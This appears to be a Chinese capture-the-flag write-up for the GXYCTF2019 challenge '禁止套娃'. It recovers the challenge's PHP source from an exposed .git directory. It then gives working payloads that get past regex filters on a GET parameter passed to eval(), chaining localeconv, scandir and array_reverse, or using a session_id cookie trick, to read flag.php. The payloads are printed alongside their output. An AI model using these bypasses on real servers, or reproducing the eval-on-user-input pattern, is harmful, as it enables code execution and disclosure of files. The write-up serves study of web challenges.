### [GXYCTF2019]禁止套娃

---

把.git拉下来,发现了index.php

```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>

```

#### 方法一：

```php
<?php
$a = localeconv();
print_r($a);

/*
Array
(
    [decimal_point] => .
    [thousands_sep] => 
    [int_curr_symbol] => 
    [currency_symbol] => 
    [mon_decimal_point] => 
    [mon_thousands_sep] => 
    [positive_sign] => 
    [negative_sign] => 
    [int_frac_digits] => 127
    [frac_digits] => 127
    [p_cs_precedes] => 127
    [p_sep_by_space] => 127
    [n_cs_precedes] => 127
    [n_sep_by_space] => 127
    [p_sign_posn] => 127
    [n_sign_posn] => 127
    [grouping] => Array
        (
        )

    [mon_grouping] => Array
        (
        )
)
*/
```

使用`current()`

```php
$b = current($a);
print_r($b);

// .
```

使用`scandir()`

`scandir()` 是 PHP 中的一个内置函数，用于获取指定目录中的文件和子目录列表

```php
$c = scandir(current(localeconv()));
print_r($c);
```

格式化输出：输出`.`目录

```
Array
(
    [0] => .
    [1] => ..
    [2] => .idea
    [3] => 1111.py
    [4] => ceshi
)

```



Payload：

```php
scandir(current(localeconv()))
```

Array ( [0] => . [1] => .. [2] => .git [3] => flag.php [4] => index.php )

```php
?exp=print_r(array_reverse(scandir(current(localeconv()))));
```

Array ( [0] => index.php [1] => flag.php [2] => .git [3] => .. [4] => . )

```php
?exp=print_r(next(array_reverse(scandir(current(localeconv())))));
```

flag.php

```php
?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
```

结果如下，得到flag

```php
flag在哪里呢？
<?php
$flag = "flag{7b3d9b1a-291e-4713-908c-c5f6a7856299}";
?>
```



#### 方法二

使用php——sessionID

```php
?exp=highlight_file(session_id(session_start()));
```

在cookie中设置：

```
PHPSESSID = flag.php
```

```php
flag在哪里呢？
<?php
$flag = "flag{8ec834a8-1fdc-4696-a669-470c20322df1}";
?>
```

